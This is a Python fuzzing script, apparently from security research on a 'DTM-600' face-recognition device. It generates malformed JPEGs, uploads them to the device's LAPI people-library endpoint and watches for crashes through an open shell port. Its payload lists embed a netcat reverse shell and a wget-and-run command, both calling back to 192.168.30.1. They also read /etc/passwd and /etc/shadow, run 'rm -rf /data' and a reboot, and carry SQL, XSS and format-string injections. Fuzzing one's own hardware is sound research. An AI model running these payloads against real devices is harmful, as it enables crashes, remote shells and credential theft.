#!/usr/bin/env python3
"""
Runtime Image Fuzzer for DTM-600
Generates malformed JPEGs and uploads via LAPI endpoint.
Monitors device for crashes via netcat shell.

Usage:
    python3 runtime-image-fuzzer.py --target 192.168.30.178 --generate-only
    python3 runtime-image-fuzzer.py --target 192.168.30.178 --fuzz
"""

import argparse
import base64
import json
import os
import random
import socket
import struct
import sys
import time
import urllib.request
import urllib.error
from pathlib import Path

# JPEG markers
SOI = b'\xff\xd8'  # Start of Image
EOI = b'\xff\xd9'  # End of Image
APP0 = b'\xff\xe0'  # JFIF
APP1 = b'\xff\xe1'  # EXIF
SOF0 = b'\xff\xc0'  # Start of Frame (baseline)
SOF2 = b'\xff\xc2'  # Start of Frame (progressive)
DHT = b'\xff\xc4'   # Define Huffman Table
DQT = b'\xff\xdb'   # Define Quantization Table
DRI = b'\xff\xdd'   # Define Restart Interval
SOS = b'\xff\xda'   # Start of Scan
COM = b'\xff\xfe'   # Comment

CORPUS_DIR = Path(__file__).parent.parent / "FUZZ_CORPUS"

class JPEGGenerator:
    """Generate various malformed JPEG test cases"""

    def __init__(self):
        self.corpus = []

    def make_minimal_jpeg(self, width=100, height=100):
        """Create minimal valid JPEG structure"""
        # This creates a ~2KB valid JPEG with gray pixels
        jpg = bytearray()
        jpg.extend(SOI)

        # APP0 - JFIF header
        jfif = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        jpg.extend(APP0)
        jpg.extend(struct.pack('>H', len(jfif) + 2))
        jpg.extend(jfif)

        # DQT - Quantization table (simplified)
        qt = bytes([16] * 64)
        jpg.extend(DQT)
        jpg.extend(struct.pack('>H', 67))
        jpg.extend(b'\x00')  # table 0
        jpg.extend(qt)

        # SOF0 - Start of Frame
        jpg.extend(SOF0)
        jpg.extend(struct.pack('>H', 11))
        jpg.extend(b'\x08')  # precision
        jpg.extend(struct.pack('>H', height))
        jpg.extend(struct.pack('>H', width))
        jpg.extend(b'\x01')  # components
        jpg.extend(b'\x01\x11\x00')  # component 1

        # DHT - Huffman table (minimal DC)
        jpg.extend(DHT)
        jpg.extend(struct.pack('>H', 31))
        jpg.extend(b'\x00')  # DC table 0
        jpg.extend(bytes([0,1,5,1,1,1,1,1,1,0,0,0,0,0,0,0]))
        jpg.extend(bytes([0,1,2,3,4,5,6,7,8,9,10,11]))

        # SOS - Start of Scan
        jpg.extend(SOS)
        jpg.extend(struct.pack('>H', 8))
        jpg.extend(b'\x01\x01\x00\x00\x3f\x00')

        # Scan data (minimal gray)
        jpg.extend(b'\x7f' * 100)

        jpg.extend(EOI)
        return bytes(jpg)

    def fuzz_exif_injection(self):
        """EXIF payloads for command injection testing"""
        payloads = [
            # Command injection
            b'$(id)',
            b'`whoami`',
            b'$(cat /etc/passwd)',
            b"'; cat /etc/shadow; '",
            b'|nc 192.168.30.1 4444 -e /bin/sh',
            b'$(wget http://192.168.30.1/shell.sh|sh)',

            # Path traversal
            b'../../../etc/passwd',
            b'....//....//etc/passwd',
            b'/data/facedb/../../etc/shadow',

            # Format strings
            b'%s%s%s%s%s%s%s%s%s%s',
            b'%n%n%n%n%n%n%n%n',
            b'%x' * 100,

            # Buffer overflow
            b'A' * 256,
            b'A' * 1024,
            b'A' * 4096,
            b'A' * 10000,

            # Null byte injection
            b'test\x00.jpg',
            b'../../etc/passwd\x00.jpg',

            # Special chars
            b'\x00\x00\x00\x00',
            b'\xff\xff\xff\xff',
            b'\x7f' * 100,
        ]

        cases = []
        for payload in payloads:
            jpg = bytearray(SOI)

            # EXIF header with payload in various fields
            exif_data = b'Exif\x00\x00II*\x00\x08\x00\x00\x00'

            # IFD entry pointing to payload
            ifd = struct.pack('<H', 1)  # 1 entry
            ifd += struct.pack('<HH', 0x010f, 2)  # Make tag (ASCII)
            ifd += struct.pack('<I', len(payload))
            ifd += struct.pack('<I', 26)  # offset to data
            ifd += struct.pack('<I', 0)  # next IFD

            full_exif = exif_data + ifd + payload

            jpg.extend(APP1)
            jpg.extend(struct.pack('>H', len(full_exif) + 2))
            jpg.extend(full_exif)

            # Add minimal valid JPEG body
            jpg.extend(self.make_minimal_jpeg()[2:])  # skip SOI

            cases.append((f'exif_inject_{len(payload)}', bytes(jpg)))

        return cases

    def fuzz_dimensions(self):
        """Dimension overflow and edge cases"""
        cases = []

        dimensions = [
            (0, 0),           # zero
            (1, 1),           # minimal
            (65535, 65535),   # max uint16
            (65536, 65536),   # overflow uint16
            (46341, 46341),   # sqrt(INT_MAX) - allocation overflow
            (0xFFFF, 1),      # wide
            (1, 0xFFFF),      # tall
            (0x7FFF, 0x7FFF), # max signed
            (0x8000, 0x8000), # overflow signed
        ]

        for w, h in dimensions:
            jpg = bytearray(SOI)
            jpg.extend(APP0)
            jpg.extend(b'\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')

            # SOF0 with manipulated dimensions
            jpg.extend(SOF0)
            jpg.extend(struct.pack('>H', 11))
            jpg.extend(b'\x08')
            jpg.extend(struct.pack('>H', h & 0xFFFF))
            jpg.extend(struct.pack('>H', w & 0xFFFF))
            jpg.extend(b'\x01\x01\x11\x00')

            jpg.extend(EOI)
            cases.append((f'dim_{w}x{h}', bytes(jpg)))

        return cases

    def fuzz_marker_abuse(self):
        """Malformed marker sequences"""
        cases = []

        # Duplicate markers
        jpg = SOI + SOI + self.make_minimal_jpeg()[2:]
        cases.append(('double_soi', jpg))

        # Missing EOI
        jpg = self.make_minimal_jpeg()[:-2]
        cases.append(('no_eoi', jpg))

        # Multiple EOI
        jpg = self.make_minimal_jpeg() + EOI + EOI + EOI
        cases.append(('triple_eoi', jpg))

        # Garbage after EOI (slack space)
        payloads = [
            b'HIDDEN_COMMAND=$(id)',
            b'\x00' * 1000,
            b'\xff' * 1000,
            b'A' * 10000,
        ]
        for i, payload in enumerate(payloads):
            jpg = self.make_minimal_jpeg() + payload
            cases.append((f'post_eoi_{i}', jpg))

        # Invalid marker lengths
        for length in [0, 1, 0xFFFF, 0x10000]:
            jpg = bytearray(SOI)
            jpg.extend(APP0)
            jpg.extend(struct.pack('>H', length & 0xFFFF))
            jpg.extend(b'X' * min(length, 100))
            jpg.extend(EOI)
            cases.append((f'bad_len_{length}', bytes(jpg)))

        # Unknown markers
        for marker in [b'\xff\x01', b'\xff\x02', b'\xff\xbf', b'\xff\xf0']:
            jpg = SOI + marker + b'\x00\x04XX' + EOI
            cases.append((f'unk_marker_{marker.hex()}', jpg))

        return cases

    def fuzz_comment_injection(self):
        """Comment field exploitation"""
        cases = []

        payloads = [
            b'$(reboot)',
            b'`rm -rf /data`',
            b"'; DROP TABLE users; --",
            b'<script>alert(1)</script>',
            b'\x00' * 1000,
        ]

        for i, payload in enumerate(payloads):
            jpg = bytearray(SOI)
            jpg.extend(COM)
            jpg.extend(struct.pack('>H', len(payload) + 2))
            jpg.extend(payload)
            jpg.extend(self.make_minimal_jpeg()[2:])
            cases.append((f'comment_{i}', bytes(jpg)))

        return cases

    def fuzz_truncation(self):
        """Truncated files at various points"""
        cases = []
        base = self.make_minimal_jpeg()

        for cut in [1, 2, 10, 50, 100, len(base)//2, len(base)-2]:
            cases.append((f'truncate_{cut}', base[:cut]))

        return cases

    def generate_corpus(self):
        """Generate complete test corpus"""
        corpus = []

        corpus.extend(self.fuzz_exif_injection())
        corpus.extend(self.fuzz_dimensions())
        corpus.extend(self.fuzz_marker_abuse())
        corpus.extend(self.fuzz_comment_injection())
        corpus.extend(self.fuzz_truncation())

        # Add minimal valid as baseline
        corpus.append(('valid_minimal', self.make_minimal_jpeg()))

        return corpus


class DeviceFuzzer:
    """Upload test cases to device and monitor for crashes"""

    def __init__(self, target_ip, lapi_port=80, shell_port=2323):
        self.target = target_ip
        self.lapi_url = f"http://{target_ip}:{lapi_port}"
        self.shell_port = shell_port
        self.results = []

    def check_device_alive(self):
        """Check if device is responding"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target, self.shell_port))
            sock.close()
            return result == 0
        except:
            return False

    def get_process_status(self):
        """Check mwareserver status via shell"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.shell_port))

            # Send command
            sock.send(b'pidof mwareserver; dmesg | tail -5\n')
            time.sleep(1)

            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            return response
        except Exception as e:
            return f"ERROR: {e}"

    def upload_image(self, jpeg_data, name="fuzz_test"):
        """Upload JPEG via LAPI endpoint"""

        # Base64 encode the image
        b64_image = base64.b64encode(jpeg_data).decode('ascii')

        # Create person record with image
        payload = {
            "PersonInfo": {
                "PersonName": name,
                "Gender": 1,
                "ImageList": [{
                    "FaceType": 1,
                    "ImageData": b64_image
                }]
            }
        }

        json_data = json.dumps(payload).encode('utf-8')

        # Try to upload (may need valid library ID)
        # Testing with common library IDs
        for lib_id in ["1", "0", "default"]:
            url = f"{self.lapi_url}/LAPI/V1.0/PeopleLibraries/{lib_id}/People"

            req = urllib.request.Request(
                url,
                data=json_data,
                headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                method='POST'
            )

            try:
                response = urllib.request.urlopen(req, timeout=10)
                return ('SUCCESS', response.status, response.read())
            except urllib.error.HTTPError as e:
                return ('HTTP_ERROR', e.code, e.read())
            except urllib.error.URLError as e:
                return ('URL_ERROR', 0, str(e))
            except Exception as e:
                return ('EXCEPTION', 0, str(e))

        return ('NO_LIBRARY', 0, 'Could not find valid library ID')

    def fuzz_single(self, name, jpeg_data):
        """Fuzz single test case and check for crash"""

        print(f"[*] Testing: {name} ({len(jpeg_data)} bytes)")

        # Check device is alive before
        if not self.check_device_alive():
            print(f"[!] Device not responding before test!")
            return {'name': name, 'status': 'DEVICE_DOWN_BEFORE'}

        # Upload test case
        result = self.upload_image(jpeg_data, f"fuzz_{name}")
        status_type, code, body = result

        # Brief pause
        time.sleep(0.5)

        # Check device is alive after
        if not self.check_device_alive():
            print(f"[!!!] CRASH DETECTED: {name}")
            return {
                'name': name,
                'status': 'CRASH',
                'size': len(jpeg_data),
                'response': (status_type, code)
            }

        # Check process status
        proc_status = self.get_process_status()
        if 'Segmentation fault' in proc_status or 'mwareserver' not in proc_status:
            print(f"[!!] Process crash detected: {name}")
            return {
                'name': name,
                'status': 'PROC_CRASH',
                'size': len(jpeg_data),
                'proc_status': proc_status
            }

        return {
            'name': name,
            'status': status_type,
            'code': code,
            'size': len(jpeg_data)
        }

    def run_campaign(self, corpus, delay=1.0):
        """Run full fuzzing campaign"""
        print(f"[*] Starting fuzzing campaign with {len(corpus)} test cases")
        print(f"[*] Target: {self.target}")
        print(f"[*] Delay between tests: {delay}s")
        print("-" * 60)

        crashes = []

        for name, jpeg_data in corpus:
            result = self.fuzz_single(name, jpeg_data)
            self.results.append(result)

            if result['status'] in ('CRASH', 'PROC_CRASH'):
                crashes.append(result)

                # Save crash case
                crash_dir = CORPUS_DIR / "crashes"
                crash_dir.mkdir(parents=True, exist_ok=True)
                (crash_dir / f"{name}.jpg").write_bytes(jpeg_data)
                print(f"[+] Saved crash case to {crash_dir / name}.jpg")

            time.sleep(delay)

        print("-" * 60)
        print(f"[*] Campaign complete. {len(crashes)} crashes found.")
        return crashes


def save_corpus(corpus, output_dir):
    """Save generated corpus to disk"""
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    for name, data in corpus:
        (output_dir / f"{name}.jpg").write_bytes(data)

    print(f"[+] Saved {len(corpus)} test cases to {output_dir}")


def main():
    parser = argparse.ArgumentParser(description='DTM-600 Image Fuzzer')
    parser.add_argument('--target', default='192.168.30.178',
                        help='Target IP address')
    parser.add_argument('--generate-only', action='store_true',
                        help='Only generate corpus, do not upload')
    parser.add_argument('--fuzz', action='store_true',
                        help='Run fuzzing campaign')
    parser.add_argument('--delay', type=float, default=1.0,
                        help='Delay between test cases (seconds)')
    parser.add_argument('--output', default=str(CORPUS_DIR),
                        help='Output directory for corpus')

    args = parser.parse_args()

    # Generate corpus
    print("[*] Generating test corpus...")
    gen = JPEGGenerator()
    corpus = gen.generate_corpus()
    print(f"[+] Generated {len(corpus)} test cases")

    # Save corpus
    save_corpus(corpus, args.output)

    if args.generate_only:
        print("[*] --generate-only specified, exiting")
        return

    if args.fuzz:
        fuzzer = DeviceFuzzer(args.target)

        print(f"\n[*] Checking device connectivity...")
        if not fuzzer.check_device_alive():
            print(f"[!] Cannot connect to {args.target}:{fuzzer.shell_port}")
            print("[!] Make sure device is powered on")
            sys.exit(1)

        print(f"[+] Device responding")

        crashes = fuzzer.run_campaign(corpus, delay=args.delay)

        # Summary
        print("\n" + "=" * 60)
        print("FUZZING SUMMARY")
        print("=" * 60)
        print(f"Total tests: {len(corpus)}")
        print(f"Crashes found: {len(crashes)}")

        if crashes:
            print("\nCrash details:")
            for c in crashes:
                print(f"  - {c['name']}: {c['status']}")


if __name__ == '__main__':
    main()
